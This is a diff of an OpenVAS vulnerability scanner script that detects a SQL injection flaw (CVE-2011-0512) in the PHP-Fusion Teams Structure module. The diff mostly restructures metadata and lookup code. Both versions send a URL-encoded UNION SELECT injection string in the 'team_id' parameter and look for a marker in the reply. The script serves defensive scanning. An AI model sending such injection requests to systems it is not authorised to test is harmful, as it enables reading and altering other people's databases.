@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_php_fusion_team_structure_sql_inj_vuln.nasl 3114 2016-04-19 10:07:15Z benallard $
+# $Id: secpod_php_fusion_team_structure_sql_inj_vuln.nasl 5668 2017-03-21 14:16:34Z cfi $
 #
 # PHP-Fusion Teams Structure Module 'team_id' SQL Injection Vulnerability
 #
@@ -24,30 +24,13 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation will allow remote attackers to to view,
-add, modify or delete information in the back-end database.
-
-Impact Level: Application.";
-
-tag_affected = "PHP-Fusion Teams Structure 3.0";
-
-tag_insight = "The flaw is due to input passed via the 'team_id' parameter to
-'infusions/teams_structure/team.php' is not properly sanitised before being
-used in SQL queries.";
-
-tag_solution = "No solution or patch was made available for at least one year
-since disclosure of this vulnerability. Likely none will be provided anymore.
-General solution options are to upgrade to a newer release, disable respective
-features, remove the product or replace the product by another one.";
-
-tag_summary = "This host is running PHP-Fusion Teams Structure Module and is prone
-to SQL injection vulnerability.";
+CPE = "cpe:/a:php-fusion:php-fusion";
 
 if(description)
 {
-  script_id(902366);
-  script_version("$Revision: 3114 $");
-  script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:07:15 +0200 (Tue, 19 Apr 2016) $");
+  script_oid("1.3.6.1.4.1.25623.1.0.902366");
+  script_version("$Revision: 5668 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-21 15:16:34 +0100 (Tue, 21 Mar 2017) $");
   script_tag(name:"creation_date", value:"2011-05-02 12:20:04 +0200 (Mon, 02 May 2011)");
   script_cve_id("CVE-2011-0512");
   script_bugtraq_id(45826);
@@ -57,48 +40,67 @@ if(description)
   script_xref(name : "URL" , value : "http://secunia.com/advisories/42943");
   script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/64727");
   script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16004/");
-
-  script_tag(name:"qod_type", value:"remote_vul");
-  script_summary("Check PHP-Fusion Teams Structure Module vulnerable to SQL Injection Attack");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2011 SecPod");
   script_family("Web application abuses");
   script_dependencies("secpod_php_fusion_detect.nasl");
   script_require_ports("Services/www", 80);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
+  script_mandatory_keys("php-fusion/installed");
+
+  tag_impact = "Successful exploitation will allow remote attackers to to view,
+  add, modify or delete information in the back-end database.
+
+  Impact Level: Application.";
+
+  tag_affected = "PHP-Fusion Teams Structure 3.0";
+
+  tag_insight = "The flaw is due to input passed via the 'team_id' parameter to
+  'infusions/teams_structure/team.php' is not properly sanitised before being
+  used in SQL queries.";
+
+  tag_solution = "No solution or patch was made available for at least one year
+  since disclosure of this vulnerability. Likely none will be provided anymore.
+  General solution options are to upgrade to a newer release, disable respective
+  features, remove the product or replace the product by another one.";
+
+  tag_summary = "This host is running PHP-Fusion Teams Structure Module and is prone
+  to SQL injection vulnerability.";
+
+  script_tag(name:"insight", value:tag_insight);
+  script_tag(name:"solution", value:tag_solution);
+  script_tag(name:"summary", value:tag_summary);
+  script_tag(name:"impact", value:tag_impact);
+  script_tag(name:"affected", value:tag_affected);
+
+  script_tag(name:"qod_type", value:"remote_app");
   script_tag(name:"solution_type", value:"WillNotFix");
+
   exit(0);
 }
-
 
 include("http_func.inc");
-include("version_func.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
 
-pfPort = get_http_port(default:80);
-if(!get_port_state(pfPort)){
-  exit(0);
-}
+if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
+if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
-## Get the directory from KB
-dir = get_dir_from_kb(port:pfPort,app:"php-fusion");
-if(!dir){
-  exit(0);
-}
+if( dir == "/" ) dir = "";
 
-## Try the exploit
-sndReq = http_get(item:string(dir, "/files/infusions/teams_structure/team.php?team_id=" +
-                    "-1%27%0Aunion+select%0A%271%27%2C%272%27%2C%273%27%2C%274%27%2C%27" +
-                    "SQL-INJECTION-TEST%27%2C%276%27%2C%277%27%2C%278%27%2C%279%27%2C%27" +
-                    "10%27%2C%2711%27%2C%2712%27%2C%2713%27%2C%2714%27%2C%2715%27%2C%27" +
-                    "16%27%2C%2717"), port:pfPort);
-rcvRes = http_keepalive_send_recv(port:pfPort, data:sndReq);
+url = dir + "/files/infusions/teams_structure/team.php?team_id=" +
+            "-1%27%0Aunion+select%0A%271%27%2C%272%27%2C%273%27%2C%274%27%2C%27" +
+            "SQL-INJECTION-TEST%27%2C%276%27%2C%277%27%2C%278%27%2C%279%27%2C%27" +
+            "10%27%2C%2711%27%2C%2712%27%2C%2713%27%2C%2714%27%2C%2715%27%2C%27" +
+            "16%27%2C%2717";
+
+sndReq = http_get( item:url, port );
+rcvRes = http_keepalive_send_recv( port:port, data:sndReq );
 
 ## Check for the Response to confirm vulnerability
-if(">SQL-INJECTION-TEST<" >< rcvRes){
-   security_message(pfPort);
+if( ">SQL-INJECTION-TEST<" >< rcvRes ) {
+  report = report_vuln_url( port:port, url:url );
+  security_message( port:port, data:report );
+  exit( 0 );
 }
+
+exit( 99 );
